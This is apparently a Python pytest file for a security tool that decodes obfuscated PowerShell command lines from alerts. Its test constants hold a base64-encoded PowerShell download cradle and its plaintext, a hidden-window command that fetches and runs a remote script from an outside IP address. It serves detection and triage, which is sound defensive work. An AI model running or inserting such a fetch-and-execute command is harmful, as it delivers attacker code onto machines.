import pytest

from alert2attack.knowledge.powershell import decode_powershell

B64 = (
    "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBu"
    "AGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAAvAGEA"
    "LgBwAHMAMQAnACkA"
)
PLAIN = "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.4/a.ps1')"


@pytest.mark.parametrize("flag", ["-enc", "-Enc", "-EncodedCommand", "-e", "-ec", "/enc"])
def test_decodes_common_flag_spellings(flag: str) -> None:
    r = decode_powershell(f"powershell.exe -NoP -W Hidden {flag} {B64}")
    assert r.encoded is True
    assert r.decoded == PLAIN
    assert r.error is None


def test_not_encoded() -> None:
    r = decode_powershell("powershell.exe -NoProfile -File C:\\scripts\\backup.ps1")
    assert r.encoded is False and r.decoded is None and r.error is None


def test_bad_base64_reports_error_not_exception() -> None:
    r = decode_powershell("powershell -enc !!!notbase64!!!")
    assert r.encoded is True and r.decoded is None and r.error is not None


def test_does_not_confuse_execution_policy_flag() -> None:
    r = decode_powershell("powershell.exe -ExecutionPolicy Bypass -File a.ps1")
    assert r.encoded is False
